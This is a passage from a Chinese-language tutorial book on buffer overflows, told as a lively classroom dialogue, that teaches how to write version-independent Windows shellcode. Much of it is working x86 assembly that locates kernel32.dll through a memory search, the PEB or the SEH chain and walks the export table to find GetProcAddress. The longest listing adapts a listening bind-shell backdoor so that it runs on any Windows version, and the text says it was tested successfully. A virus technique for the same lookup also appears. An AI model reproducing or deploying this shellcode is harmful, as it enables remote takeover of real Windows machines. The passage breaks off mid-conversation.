# 第六章 ShellCode 编写高级技术

天气渐渐变冷了，而今天，是特别的冷。老师走进教室，跺跺脚说：“好冷啊！”

“是啊！冬天来了。”台下的同学呼出的气都是白雾，很多人都带上了手套。

“大家注意身体啊！”老师打开了教学设备，“大家下去有没有测试前面学习的内容啊？”

“当然有啊！”宇强回答道，“在微软精英们的打击下，我们都倍感差距。终日抓紧，不敢有丝毫懈怠啊！”

“呵呵！有差距感就好。大家在实践的时候，发下了什么问题没有？“

“有啊！我发现外面的 ShellCode 据称都是版本通用的，我测试了一下，也的确能用。它们是怎么实现的呢？”古风说。

”这个问题问得好。”老师表扬道。

玉波摸摸肚子，说到：“我觉得提取 ShellCode 时，通过抄机器码太累了，而且觉得实在没必要做如此机械的工作。”

“嗯！是啊！”大家都表示赞同。

“哦！”宇强忽然想起来了，说道：“我还想知道那些漏洞是怎么发现的呢！希望自己能掌握、发现位置漏洞的方法，并能利用漏洞！“

老师说：“发现未知的漏洞……这个难度很大啊！”

“哇！不会吧？”大家都一脸的不悦。

”呵呵！但也有一些技术和方法了，大家还是可以讨论一下。好！我明白大家想知道什么了。首先，我们来看看 ShellCode 编写和提取的高级技巧吧！”

# 6.1 通用 ShellCode 的编写

## 6.1 通用 ShellCode 的编写

“现在外面使用的 ShellCode，都是各版本通用的，”老师介绍道，“这是通用攻击程序编写的必要基础。可以说，通用的 ShellCode＋通用的跳转地址 ＝ 通用的 Exploit。”

“通用的跳转地址我们已经有了，那通用的 ShellCode 时怎么来的呢？ ”大家迫不及待的说，“我们好想知道啊！”

“大家有动力就好，我们一起来看看 ShellCode 通用性的解决过程吧！在这个过程中，大家可切实体会到：技术是一代接一代推动发展的！”

# 6.1.1 思路——动态定位函数的地址

### 6.1.1 思路——动态定位函数的地址

“ShellCode 的执行过程就是调用函数的过程。”老师说道，“Windows 下调用函数分为两步，一是参数入栈；二是 CALL 函数地址。”

“那大家想想，我们前面写的 ShellCode，各系统版本间不能混用，其原因是出在哪里呢？”

“原因……原因出于版本不同！”玉波回答道。

“晕！拿究竟是参数入栈不同，还是调用函数地址不同呢？”老师提醒大家。

“参数入栈部分看起来是一样的；拿应该时各个版本下函数的地址不同吧！”宇强分析道。

“对！系统不同，同一个函数的地址就不同。比如 Windows 2000 和 XP，或者中文版 XP 和英文版 XP，LoadLibrary 函数的地址都不同；而且，同样的系统、同样的语言版本，SP 补丁不同，函数的地址也不同。”

“哦，ShellCode 的通用性就是要解决函数地址的通用性吧！”

“非常正确！”

“难道每个函数都存在各版本通用的隐藏地址？我们直接调用隐藏地址就行了？”玉波想起当年打 C&C 的隐藏关卡。

“这个我不知道，可能要问问比尔.盖茨才知道哦！”老师笑着说，“但系统可不像游戏。除了偶尔存在象 tlEnterCriticalSection 函数指针外，其他函数的地址都绝对不同！”

“那怎么完成通用的呢？真是‘Mission Impossible’啊！”大家苦苦思索。

“我提示一下，在 ShellCode 的编写中，我们曾用过 GetProcAddress 来获得其他函数的地址……”

“对啊！老师真是汤姆.克鲁斯啊！”大家顿觉山穷水尽疑无路，柳暗花明又一村，“我们不使用固定的函数地址，而是在 ShellCode 中先用 GetProcAddress 获得函数的地址——获得当时所在系统上的地址，然后在调用它！”

“呵呵？别人都说我是三重刘德华呢！”老师开玩笑的说，“很好！但除了 GetProcAddress 外，还需要知道 LoadLibrary 的地址；然后我们就可利用这两个函数来动态获得其他函数的地址，并存起来。以后，要调用函数时，就使用保存起来的地址，从而完成具有通用性的 ShellCode！”

“哦，明白了！思路应该时这样。我们动态定位函数的地址再调用。”学生们画出了图 6－1 的示意图。

![](img/Q 版缓冲区溢出教程 178882.jpg)

“对！就是这样！”老师看了看，满意的说。

“但如何获得 GetProcAddress 和 LoadLibrary 的地址呢？”老师又问道。

大家又愣住了，“是啊，怎么获得呢？好像这两个函数的地址并没有宇宙通用版啊！”

“大家能想到这里，很不错！这也是早期 ShellCode 卡住的地方。”老师说道，“当人们对宇宙、对地球、对 Windows 系统不断的深入认识后，终于有了解决的方法。”

“哦？这么厉害，什么方法？”

“就是利用 Windows 的系统结构来获得 GetProcAddress 和 LoadLibrary 函数的地址。”

# 6.1.2 方法一、野蛮的暴力搜索

### 6.1.2 方法一、野蛮的暴力搜索

“在国内，首先想出方法的是 guange。”老师说道。

“哦！又是他啊！”大家想起在编码时讲过他的方法。

“他在很早以前，就对 Windows 的系统技术炉火纯青。不仅编码，动态定位，而且在 ShellCode 高级功能、高级提取方面都有很深的造诣，但……鲜有详细的文档记录。现在他也把很多东西都忘了吧！我们只能通过他的程序临摹一招半式了。”

“哦！”

“所以，我给你们上的课，都是在做扫地的工作，也就是‘扫地僧’！”

“哇！做‘扫地僧’好啊，是金庸大侠手下武功最高的人物了！”小倩一副很羡慕的样子。

“汗～是啊！为了让像大家一样的初学者引起兴趣，尽快入门！我会担当起‘扫地僧’责任的。”老师说道。

“多谢老师！我们也会努力学习的，不会辜负老师的期望。”教室里大家都纷纷表态。

“别谢我什么，要谢就谢《Q 版黑客》系列图书吧！谢谢他们全力的支持，才使这门课得以顺利开展。

”好了，我们来看看 yuange 提出的方法。”老师又回到了正题。

“yuange 提出的思路就是：SHELLCODE 只依靠 GetProcAddress 和 LoadLibraryA 这两个函数；而 LoadLibraryA 是在系统库 KERNEL32.DLL 里面的，也可以使用 GetProcAddress 得到，所以我们只需知道 GetProcAddress 的地址就可以了。

“哦！是啊！但 GetProcAddress 的地址又怎么获得呢？这是关键啊!”大家着急的说。

“呵呵，yuange 说了（怎么像黑社会的……），kernel32.dll 一般都会被加载，所以解决办法就是在内存里查找 kernel32.dll 这个系统库和 GetprocAddress 函数的地址。”

“查找？”

“俗称就是暴力搜索！”

“啊！暴力搜索！好恐怖啊！”大家紧张的的说。

“其实，只要了解了 Windows 的系统结构就不难。袁哥的程序，是从 0x77e0000 或 0xbff00000 开始搜索，搜索到 MZ 和 PE 标志时，就表示是 kernel32.dll 的开始地方。”

小知识：PE 结构

PE 的意思就是 Portable Executable（可移植的执行体）。它是 Win32 环境自身所带的执行体文件格式。所有 Win32 执行体都使用 PE 文件格式，包括 NT 的内核模式驱动程序。

PE 文件结构以一个 IMAGE_DOS_HEADER 结构开始，所以开头是一个简单的 DOS MZ header，紧随 MZ header 之后的是 DOS stub。紧接着 DOS stub 的是 PE header，所以可以根据 MZ 和 PE 标志来判断一个程序是否是可执行程序，其详细结构如下：

```
typedef struct _IMAGE_DOS_HEADER {?? 
    WORD e_magic; ;DOS 可执行文件标记“MZ”
    WORD e_cblp;
    WORD e_cp;
    WORD e_crlc;
    WORD e_cparhdr;
    WORD e_minalloc;
    WORD e_maxalloc;
    WORD e_ss;
    WORD e_sp;
    WORD e_csum;
    WORD e_ip; 
    WORD e_cs;
    WORD e_lfarlc;
    WORD e_ovno;
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10]; 
    LONG e_lfanew; ;指向 PE 文件头"PE",0,0
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; 
```

“找到 kernel32 后，再搜索函数的引出表，找到 LoadLibrary 的函数名和 LoadLibrary 函数对应的地址就完成了搜索。”

“我把 yange 的程序加上了一些注释，大家下来可参考 SearchByYuange.cpp（光盘有收录），这里就不作详细解释了。”老师说道。

“啊？为什么不解释呢？还不大懂呢！”

“呵呵，第一是因为代码复杂难懂，我这个‘扫地僧’要解释清楚也很困难；第二是从 0x77e00000 或 0xbff00000 开始搜索，已经不完全通用了；第三是技术不断进步，后来有了更为优雅、更为完美的方法。而且后面讲的方法和 yuange 的方法大部分是一样的，我们学习之后，也就都清楚了。”

# 6.1.3 方法二、PEB 获取 GetProcAddrees 函数地址

### 6.1.3 方法二、PEB 获取 GetProcAddrees 函数地址

“我们还是来‘独览大略’吧！”老师说道，“斗转星移，随着时间的发展，有了更简单、优雅的搜索方法。”

“哦，是谁最先提出来的呢？”

“这个……我也不知道，估计最早提出来的时候，我连电脑都不知为何物呢！呵呵！”老师说，“我看国内倒是 jneo 和 scz 都有过详细的分析。这种方法还是分为两部分，第一部分是获得 kerner32.dll 的基址；第二部分是动态获得函数的地址。”

“哦！yange 获得 kerner32.dll 基址的方法是暴力搜索吧？”古风问道。

“对！而 jneo 和 scz 则使用了改进的方法，利用 PEB 结构来获得 kerner32.dll 的基址。”

“PEB，进程环境块？好像以前介绍过。”大家隐约有点印象。

“是啊，在堆溢出利用时，我们介绍过覆盖 PEB 里面的 RtlEnterCriticalSection 函数指针，大家可翻翻以前的笔记。而这里，利用 PEB 获得 kernel32.dll 的原理如下：”

老师在黑板上写了下来。

1.fs 寄存器指向 TEB 结构

2.在 TEB+0x30 地方指向 PEB 结构

3.在 PEB+0x0C 地方指向 PEB_LDR_DATA 结构

4.在 PEB_LDR_DATA+0x1C 地方就是一些动态连接库地址了，如第一个指向 ntdll.dll，第二个就是 kernel32.dll 的地址。

“其结构示意图如图 6－2。”

![](img/Q 版缓冲区溢出教程 181561.jpg)

“老师，为什么给出的偏移量正好指向想要的结构呢？”玉波问道。

“因为……比尔.盖茨当初就是这么设计来着。”

“那比尔.盖茨为什么要这样设计呢？”玉波又问。

“那可能是由他生活的环境和个人性格造就的吧！”

“哦？是什么环境和性格造就了他这么设计呢？”玉波要打破沙锅问到底了。

“噢！那是美国的诞生和文化造就了那样的环境和性格呀！好了，要完全解决这个问题，我们就只有使用回溯法，回溯到亿万年前，宇宙大爆炸的时候，可能某个尘埃的偏移加速度的值，导致了今天有这么一位比尔.盖茨；可能那个尘埃的某次碰撞变向，导致了比尔.盖茨采用这样的结构设计。”

“……”大家无语了。

“呵呵，人类一思考，上帝就发笑。有很多事情，我们是无法探其根源的，只能接受！就如同我们不知道，也不用去知道，在大爆炸前的宇宙是什么样的一样，我们只能认为时间是从那一刻才开始的。”

“我们还是看看更关心的东西吧！利用 PEB 查找 kernerl32 地址的汇编实现吧！以下是汇编实现。”

```
mov eax, fs:0x30 ;PEB 的地址
mov eax, [eax + 0x0c] ;Ldr 的地址
mov esi, [eax + 0x1c] ;Flink 地址
lodsd 
mov eax, [eax + 0x08] ;eax 就是 kernel32.dll 的地址 
```

“很优雅吧？呵呵！”老师问道。

“哇！和暴力搜索相比，简直是天壤之别啊！”

“呵呵！程序设计真的是门艺术啊！顺便说一下，在刚刚结束的 29 届 ACM 国际大学生程序设计竞赛亚洲赛区预赛北京赛的比赛中，上海交大以五道的成绩获得冠军！我们学校队过了三道题，获得铜奖。”

老师有点可惜的说：“这次很有希望啊，就差最后一点的突破了。大家多努力啊！你们是八九点钟的太阳！以后的希望就在你们的身上了。”

“如果能够代表学校去北京参加亚洲预赛的话，太精彩了！”大家的气势被带动了起来。

宇强心想，自己在大学生涯中一定要不断努力，努力，再努力！大学生活充满阳光，自己也需要充满激情和挑战；希望在自己毕业时，能对这四年青葱岁月无悔，还能像现在这样，对未来充满好奇和梦想！

“好，我们回到程序中，来测试一下。”老师的话把宇强拉了回来，“在 VC 中嵌入这几句汇编，然后调试执行，当执行完 mov eax, [eax + 0x08] 时，可以看到 eax 中保存了我们正确的 kernel32.dll 的地址——XP 系统 SP0 下为 0x77E40000。如图 6－3。”

![](img/Q 版缓冲区溢出教程 182598.jpg)

“哇！EAX 真的是 77E40000 啊！实在太方便了。”

“嗯，我们继续，”老师一口气接着说道，“第二部分就是要动态获得函数地址了。”

“也是与系统结构相关吗？”

“当然，完全是 Windows 系统的结构让我们可以使用这种方法，如果拿到 Linux 下，就完全行不通了。”

“动态获得函数地址的部分和 yuange 使用的方法是一样的。”老师说道，“就是利用 Kernel32.dll 中的引出表！”

“每个 dll 都有引出表，这样，外部程序可以调用 dll 里实现的函数，而不必关心实现的细节。”老师接着说，“而 GetProcAddress 是在 kernel32.dll 里实现的，所以我们可通过查找 kernel32.dll 的引出表来找到 GetProcAddress 函数。”

“查找引出表？什么意思？”

“嗯，这就要解释一下引出表和我们找地址的过程了。有点麻烦，大家可要集中点精神听啊！”

“首先，引出表的结构如下：”

```
Typedef struct _IMAGE_EXPORT_DIRECTORY
{
    Characteristics; 4
    TimeDateStamp 4
    MajorVersion 2
　　MinorVersion 2
　　Name 4 模块名字
　　Base 4 基数，加上序数就是函数地址数组的索引值
　　NumberOfFunctions 4
    NumberOfNames 4
    AddressOfFunctions 4 指向函数地址数组
　　AddressOfNames 4 函数名字的指针地址
　　AddressOfNameOrdinal 4 指向输出序列号数组
} 
```

每个字段的解释如表 1。

![](img/Q 版缓冲区溢出教程 183311.jpg)

“不用去记它，记下来也没用。我们只关心最后几个字段，如图 6－4。”

![](img/Q 版缓冲区溢出教程 183350.jpg)　　

“给大家解释一下图上的某些字段涵义：”

图 6－4 中的字段涵义：

NumberOfFunctions 字段：为 AddressOfFunctions 指向的函数地址数组的个数，此例中，这里是 3；

NumberOfName 字段：为 AddressOfNames 指向的函数名称数组的个数，这里是 2；

AddressOfFunctions 字段：指向模块中所有函数地址的数组；

AddressOfNames 字段：指向模块中所有函数名称的数组；

AddressOfNameOrdinals 字段：指向 AddressOfNames 数组中函数对应序数的数组。

“我们查找函数地址时，先在函数名称数组中找到需要的函数名；然后在函数序号数组中得到对应的函数序号；最后根据这个序号，在函数地址数组中得到对应的地址值。”

“好抽象啊！头晕啊！老师，给个例子吧！”玉波嚷道。

“好，比如我们在那个引出表中查找 MyFunc3 函数的地址。”

“先从 AddressOfName 开始，依次在函数名数组中查找与 MyFunc3 相同的项，从而得到 MyFunc3 在函数名数组中是第几个函数。在图 6－4 的例子中，MyFunc3 是第二个函数。”

“然后，我们从 AddressOfNameOrdinals 开始，在函数序号数组中查找 MyFunc3 函数对应的序号。在函数序号数组中，第二个函数序号数组的序号值是 3。”

“最后，根据序号 3，从 AddressOfFunctions 开始的函数地址数组中查找 MyFunc3 函数的地址。在函数地址数组中，第 3 项的值是 0x400197。这样，我们就得到了 MyFunc3 函数的地址——0x400197。”

“哦，是这样啊！”

“但……输出表在哪儿呢？”一直没说话的宇强问道。

“呵呵，知道了 kerner32.dll 的基地址后，其 PE 头部偏移在 kerner32.dll 基址＋0x3C 的地方；而输出表的位置在 kerner32.dll 基地址+PE 头部地址+0x78 的地方。”

“而 kerner32.dll 的基地址我们刚刚学会了：从 PEB 中获得。什么预备工作都完成了，我们来看看搜索函数地址流程吧！”老师说道。

a. 通过 TEB/PEB 获取 kernel32.dll 基址

b. 在(基址+0x3c)处获取 e_lfanewc 就是 PE 标志。

c. 在(基址+e_lfanew+0x78)处获取引出表地址(后面为描述方便简称 export)

d. 在(基址+export+0x1c)处获取 AddressOfFunctions、AddressOfNames、AddressOfNameOrdinalse。

e. 搜索 AddressOfNames，确定“GetProcAddress”所对应的 index

f. index = AddressOfNameOrdinalse [ index ];

g. 函数地址 = AddressOfFunctions [ index ];

“比如，我们想查找 GetProcAddress 的地址，就在函数名称数组中，搜索 GetProcAddress 的名称；找到后根据编号，在序号数组中，得到它对应的序号值；最后根据序号值，在地址数组中，提取出它的地址。其汇编代码如下，并给出了详细的解释。”

```
 __asm
{
    mov ebp, 0x77E40000 ;kernel32.dll 基址
    mov eax, [ebp+3Ch] ;eax = PE 首部
    mov edx,[ebp+eax+78h]
    add edx,ebp ;edx = 引出表地址
    mov ecx , [edx+18h] ;ecx = 输出函数的个数
    mov ebx,[edx+20h] 
    add ebx, ebp ;ebx ＝函数名地址，AddressOfName 
    search:
    dec ecx
    mov esi,[ebx+ecx*4] 
    add esi,ebp ;依次找每个函数名称
    ;GetProcAddress
    mov eax,0x50746547
    cmp [esi], eax; 'PteG'
    jne search
    mov eax,0x41636f72
    cmp [esi+4],eax; 'Acor'
    jne search 
    ;如果是 GetProcA，表示找到了 
    mov ebx,[edx+24h]
    add ebx,ebp ;ebx = 序号数组地址,AddressOf
    mov cx,[ebx+ecx*2] ;ecx = 计算出的序号值
    mov ebx,[edx+1Ch]
    add ebx,ebp ;ebx＝函数地址的起始位置，AddressOfFunction
    mov eax,[ebx+ecx*4] 
    add eax,ebp ;利用序号值，得到出 GetProcAddress 的地址
} 
```

“我们来测试一下吧！在 VC 中嵌入汇编，并单步调试，执行到最后一句时，可以发现 EAX 是 0x77E5A5FD，即得到了我们系统 XP SP0 的 GetProcAddress 函数的地址：0x77E5A5FD，如图 6－5。”

![](img/Q 版缓冲区溢出教程 185460.jpg)　　

“我们直接获得地址看看！如图 6－6，EAX 果然也是一样，XP SP0 的 GetProcAddress 函数地址就是 0x77E5A5FD！”

![](img/Q 版缓冲区溢出教程 185534.jpg)

“哇！太妙了！”大家说道。

“嗯，我们把获得 Kernel32.dll 地址部分和获得函数地址部分合起来，就可动态得到 GetProcAddress 函数的地址，而且与系统版本是无关的！”

“在动态得到了 GetProcAddress 函数的地址后，我们再使用它来动态获得其他函数的地址，这样生成的 ShellCode 就是通用的了。我们结合实际例子来应用它吧！”

# 6.1.4 通用 ShellCode 的编写——监听后门

### 6.1.4 通用 ShellCode 的编写——监听后门

“我们把以前写的双管道后门 ShellCode 改成各系统通用的版本吧！”老师说道，“我们用刚才的思路，在获得了 GetProcAddress 函数的地址后，再调用 GetProcAddress，这样获得所有要使用的函数地址后，存起来就可以了。”

大家都点点头。

老师喝了口水，说道：“看看以前的那个 ShellCode，一开始就把各函数在 XP SP0 下的地址存放了起来，所以不通用。我们修改时，只需加上一段动态获得各函数地址的代码，然后再存放就可以了。”

“具体来说，原来的实现是这样的，直接存放地址值。”

```
//原来的实现，把要用到的函数地址存起来——以下都是 XP SP0
mov eax,0x77e5727a
mov [ebp+4], eax; CreatePipe
mov eax,0x77e41bb8
mov [ebp+8], eax; CreateProcessA
mov eax,0x77e97624
mov [ebp+12], eax; PeekNamedPipe 
mov eax,0x77e59d8c
mov [ebp+16], eax; WriteFile
mov eax,0x77e58b82
mov [ebp+20], eax; ReadFile
mov eax,0x77e55cb5
mov [ebp+24], eax; ExitProcess
mov eax,0x71a241da
mov [ebp+28], eax; WSAStartup
mov eax,0x71a23c22
mov [ebp+32], eax; socket
mov eax,0x71a23ece
mov [ebp+36], eax; bind
mov eax,0x71a25de2
mov [ebp+40], eax; listen
mov eax,0x71a2868d
mov [ebp+44], eax; accept
mov eax,0x71a21af4
mov [ebp+48], eax; send
mov eax,0x71a25690
mov [ebp+52], eax; recv 
```

“而现在，我们首先加上一段前面的动态获取 GetProcAddress 函数地址的代码。”

```
mov eax, fs:0x30 ;PEB
mov eax, [eax + 0x0c] ;Ldr
mov esi, [eax + 0x1c] ;Flink
lodsd 
mov edi, [eax + 0x08] ;edi 就是 kernel32.dll 的地址
mov eax, [edi+3Ch] ;eax = PE 首部
mov edx,[edi+eax+78h]
add edx,edi ;edx = 输出表地址
mov ecx,[edx+18h] ;ecx = 输出函数的个数
mov ebx,[edx+20h] 
add ebx,edi ;ebx ＝函数名地址,AddressOfName 
search:
dec ecx
mov esi,[ebx+ecx*4] 
add esi,edi ;依次找每个函数名称
;GetProcAddress
mov eax,0x50746547
cmp [esi], eax; 'PteG'
jne search
mov eax,0x41636f72
cmp [esi+4],eax; 'Acor'
jne search 
;如果是 GetProcA，表示找到了 
mov ebx,[edx+24h]
add ebx,edi ;ebx = 索引号地址，AddressOf
mov cx,[ebx+ecx*2] ;ecx = 计算出的索引号值
mov ebx,[edx+1Ch]
add ebx,edi ;ebx＝函数地址的起始位置,AddressOfFunction
mov eax,[ebx+ecx*4] 
add eax,edi ;利用索引值，计算出 GetProcAddress 的地址 
```

“然后，依次动态获得 CreatePipe、CreateProcessA 等函数的地址，替换直接存放的值。比如，找 CreatePipe 函数地址的代码如下：”

```
push dword ptr 0x00006570
push dword ptr 0x69506574
push dword ptr 0x61657243
push esp
push edi 
call [ebp+76]
mov [ebp+4], eax; CreatePipe 
```

老师解释道：“相当于执行 GetProcAddress（kernel32 基址，”CreatePipe”）。还是一样，先把参数 CreatePipe 字符串地址和 kernel32 的基址值依次入栈，然后 call GetProcAddress 函数的地址（我们之前把它存在 ebp+76 的地方），所以 call [ebp+76] 就执行了 GetProcAddress (kernel32 基址，”CreatePipe”) 这句话。Eax 为返回值——CreatePipe 函数的地址，我们把它存在对应的 ebp+4 的地方。”

“哦！”同学们明白了，“后面的函数也是这样获取？”

“是的！”老师说到，“但要注意，像 Socket 一类套接字函数的地址，不是在 kernel32.dll 中，而是在 Ws2_32.dll 中！所以，我们要先 LoadLibrary(“Ws2_32.dll”) 获得 Ws2_32.dl 的基址，再用 GetProcAddress (Ws2_32.dl 基址,” socket”) 来获取类似套接字函数的地址。”

“具体说来，就是要加上如下获取函数地址的代码。”

```
push ebp;
sub esp, 100; 
mov ebp,esp;
mov eax, fs:0x30 ;PEB
mov eax, [eax + 0x0c] ;Ldr
mov esi, [eax + 0x1c] ;Flink
lodsd 
mov edi, [eax + 0x08] ;edi 就是 kernel32.dll 的地址
mov eax, [edi+3Ch] ;eax = PE 首部
mov edx,[edi+eax+78h]
add edx,edi ;edx = 输出表地址
mov ecx,[edx+18h] ;ecx = 输出函数的个数
mov ebx,[edx+20h] 
add ebx,edi ;ebx ＝函数名地址,AddressOfName 
search:
dec ecx
mov esi,[ebx+ecx*4] 
add esi,edi ;依次找每个函数名称
;GetProcAddress
mov eax,0x50746547
cmp [esi], eax; 'PteG'
jne search
mov eax,0x41636f72
cmp [esi+4],eax; 'Acor'
jne search 
;如果是 GetProcA，表示找到了 
mov ebx,[edx+24h]
add ebx,edi ;ebx = 索引号地址,AddressOf
mov cx,[ebx+ecx*2] ;ecx = 计算出的索引号值
mov ebx,[edx+1Ch]
add ebx,edi ;ebx＝函数地址的起始位置，AddressOfFunction
mov eax,[ebx+ecx*4] 
add eax,edi ;利用索引值，计算出 GetProcAddress 的地址
mov [ebp+76], eax ;把 GetProcAddress 的地址存在 ebp+76 中
push 0x0
push dword ptr 0x41797261
push dword ptr 0x7262694c
push dword ptr 0x64616f4c
push esp
push edi 
call [ebp+76]
mov [ebp+80], eax; LoadLibraryA ;把 LoadLibraryA 的地址存在 ebp＋80 中
push dword ptr 0x00006570
push dword ptr 0x69506574
push dword ptr 0x61657243
push esp
push edi 
call [ebp+76]
mov [ebp+4], eax; CreatePipe 0x00006570 69506574 61657243
push dword ptr 0x00004173
push dword ptr 0x7365636f
push dword ptr 0x72506574
push dword ptr 0x61657243
push esp
push edi
call [ebp+76]
mov [ebp+8], eax; CreateProcessA 0x4173 7365636f 72506574 61657243
push dword ptr 0x00000065
push dword ptr 0x70695064
push dword ptr 0x656d614e
push dword ptr 0x6b656550
push esp
push edi
call [ebp+76]
mov [ebp+12], eax; PeekNamedPipe 0x00000065 70695064 656d614e 6b656550
push dword ptr 0x00000065
push dword ptr 0x6c694665
push dword ptr 0x74697257
push esp
push edi
call [ebp+76]
mov [ebp+16], eax; WriteFile 0x00000065 0x6c694665 0x74697257
push dword ptr 0
push dword ptr 0x656c6946
push dword ptr 0x64616552 
push esp
push edi
call [ebp+76]
mov [ebp+20], eax; ReadFile 
push dword ptr 0x00737365
push dword ptr 0x636f7250 
push dword ptr 0x74697845
push esp
push edi
call [ebp+76]
mov [ebp+24], eax; ExitProcess 0x00737365 0x636f7250 0x74697845
push dword ptr 0x00003233
push dword ptr 0x5f327357
push esp
call [ebp+80] ;LoadLibrary(Ws2_32) 0x00003233 5f327357
mov edi, eax 
push dword ptr 0x00007075
push dword ptr 0x74726174
push dword ptr 0x53415357
push esp
push edi
call [ebp+76]
mov [ebp+28], eax; WSAStartup 0x00007075 0x74726174 0x53415357
push dword ptr 0x00007465
push dword ptr 0x6b636f73 
push esp
push edi
call [ebp+76]
mov [ebp+32], eax; socket 0x00007465 0x6b636f73
push dword ptr 0
push dword ptr 0x646e6962 
push esp
push edi
call [ebp+76]
mov [ebp+36], eax; bind 0x646e6962
push dword ptr 0x00006e65
push dword ptr 0x7473696c
push esp
push edi
call [ebp+76]
mov [ebp+40], eax; listen 0x00006e65 0x7473696c
push dword ptr 0x00007470
push dword ptr 0x65636361 
push esp
push edi
call [ebp+76]
mov [ebp+44], eax; accept 0x00007470 0x65636361
push 0
push dword ptr 0x646e6573 
push esp
push edi
call [ebp+76]
mov [ebp+48], eax; send 0x646e6573
push 0
push dword ptr 0x76636572 
push esp
push edi
call [ebp+76]
mov [ebp+52], eax; recv 0x76636572
mov eax,0x0
mov [ebp+56],0
mov [ebp+60],0
mov [ebp+64],0
mov [ebp+68],0
mov [ebp+72],0
LWSAStartup: 
```

“动态获取每个函数的地址后，剩下的代码就完全不用改变。我们把它合起来后，得到 Pipe2AllVersionAsm.cpp（光盘有收录）。再测试一下，果然成功了！如图 6－7。”

![](img/Q 版缓冲区溢出教程 191387.jpg)

“欢迎大家来到——宇宙通用版！”老师说道。

“哇！太 Cool 了！”教室里一阵欢腾，把中国队 7:0 都没有出线的悲伤抛在了脑后。

“接下来大家应该知道做什么了吧？”老师笑道。

“啊？做什么呢？” 玉波装糊涂的问道。

“提取 ShellCode 啊！”老师可一点儿不含糊。

“哇！这么长的代码，好可怕啊！”连一向勤奋的古风都受不了一句句抄写的“折磨”，“有没有简单点的方法啊？”

“嗯，”老师打量了一下代码说道，“是有点长……反正大家的思路都清楚了，再抄也没必要了。”

“就是啊！”台下齐声说道。

“好，那这次就先别提取了，留在我们讲 ShellCode 提取技巧时再说吧！我们继续看其他的方法。”

“好啊！”大家不用做单调的苦力活，高兴 ing……

# 6.1.5 方法三、SEH 获得 kernel 基址

### 6.1.5 方法三、SEH 获得 kernel 基址

“海纳百川，有容乃大！”老师说道，“我们再看看其他动态获得函数地址的方法吧！大家可以了解各种方法的优劣，在不同的时候选用不同的方法。”

“嗯，好的！”

“还有个比较有名的方法，是通过 SEH 异常处理链来获得 Kernel32.dll 的基址，再采用引出表的方法，获取函数的地址。”

“哦？怎么通过 SEH 获得 Kernel32.dll 的地址呢？”大家感兴趣的问道。

“呵呵！前面大家已经接触过了默认异常处理函数——UnhandledExceptionFilter，还记得它吗？”

“当然记得，在堆溢出利用时，我们一般都是通过覆盖这个默认异常处理函数指针来获得控制权的。”

“对，这里我要说的是，UnhandledExceptionFilter 指针是在异常链的最后，它的上一个值是指向下一个处理点的地址。因为后面没有异常处理点了，所以应该是 0xFFFFFFFF。如图 6－8。”

![](img/Q 版缓冲区溢出教程 192124.jpg)

根据这个原理，我们可以搜索异常链，得到 UnhandledExceptionFilter 的地址，方法和代码如下：”

```
mov esi,fs:0
lodsd
GetExeceptionFilter:
cmp [eax],0xffffffff
je GetedExeceptionFilter //如果到达最后一个节点
mov eax,[eax] //否则往后遍历,一直到最后一个节点
jmp GetExeceptionFilter
GetedExeceptionFilter:
mov eax, [eax+4] 
```

“测试一下，最后一句执行时，得到我们的 UnhandledExceptionFilter 地址为 0x77E7BB86。如图 6－9 中的 EAX 值。”

![](img/Q 版缓冲区溢出教程 192457.jpg)　　

“嗯，不错不错！这下我们知道了 UnhandledExceptionFilter 函数的地址了，但和 Kernerl32 的基地址有什么关系吗？”古风问道。

“不要急嘛！听我分析一下，UnhandledExceptionFilter 函数是 Kernel32.dll 里面的函数，那函数的地址必然是在 Kernel32 的地址空间内。我们就从 UnhandledExceptionFilter 函数的地址往上找，找到开头的地方，自然就是 Kerner32 的基地址了。”

“哇！对啊！”

“Kerner32 的开始标志是 MZ 和 PE，而且因为系统分配某个空间时，总要从一个分配粒度的边界开始，在 Windows 下，这个粒度是 64KB。所以我们搜索时，可以按照 64kb 递减往低地址搜索，当到了 MZ 和 PE 标志时，就找到了 Kernel32 的基地址。实现代码如下：”

```
FindMZ:
and eax,0xffff0000 //64k 对齐特征加快查找速度
cmp word ptr [eax],'ZM' //根据 PE 可执行文件特征查找 KERNEL32.DLL 的基址
jne MoveUp
mov ecx,[eax+0x3c]
add ecx,eax
cmp word ptr [ecx],'EP' //根据 PE 可执行文件特征查找 KERNEL32.DLL 的基址
je Found //如果符合 MZ 及 PE 头部特征，则认为已经找到，并通过 Eax 返回给调用者
MoveUp:
dec eax //准备指向下一个界起始地址
jmp FindMZ
Found:
nop 
```

“之前，eax 中存的是 UnhandledExceptionFilter 函数的指针。我们把前面两段合起来，得到 FindKernelBySEH.cpp（光盘有收录），运行测试一下。”

“在 VC 中用 __asm 关键字嵌入汇编，按 F10 单步调试，到最后一句时，结果如图 6－10。得到 Kernel32 的基址为 0x77E40000，和前面得到的值是一样的。”

![](img/Q 版缓冲区溢出教程 193304.jpg)　　

“这个方法也很巧妙也！”大家赞叹不已，感叹怎么会有如此天才的人。

“程序就是艺术，不能用语言表达，只能凭心去感受。”老师说道。

“在病毒中，还有种方法也是类似的。原理是：可执行程序都由 Kernel32.dll 中的 CreateProcess 函数来调用，所以病毒先得到堆栈中保存的返回地址，也就是 Kernel32.dll 地址空间的一个地址；然后再使用刚才的方法向上搜索，找到 kernel32 的基址。代码如下：”

```
Mov dword ptr eax, [esp+0x1C] //保存的返回地址，在 kernel32 中
FindMZ:
and eax,0xffff0000 //64k 对齐特征加快查找速度
cmp word ptr [eax],'ZM' //根据 PE 可执行文件特征查找 KERNEL32.DLL 的基址
jne MoveUp
mov ecx,[eax+0x3c]
add ecx,eax
cmp word ptr [ecx],'EP' //根据 PE 可执行文件特征查找 KERNEL32.DLL 的基址
je Found //如果符合 MZ 及 PE 头部特征，则认为已经找到，并通过 Eax 返回给调用者
MoveUp:
dec eax //准备指向下一个界起始地址
jmp FindMZ
Found:
nop 
```

“哦，涉及到病毒了，越来越有意思了。”

“呵呵，本是同根生嘛！”

“获得 kernel32 的基址后，我们再用引出表获得 Get 的地址，再获得其他函数的地址，是吗？”同学们问道。

“对！但要注意的是，这个方法是通过搜索异常链表，然后对齐搜索得到 kerner32 的基址。如果溢出利用方式是通过覆盖 SEH，然后 CALL EBX 或 pop pop ret 来改变程序流程，那么 SEH 链已经被我们覆盖，这种方法就会出错。”

“哦！那怎么办？”

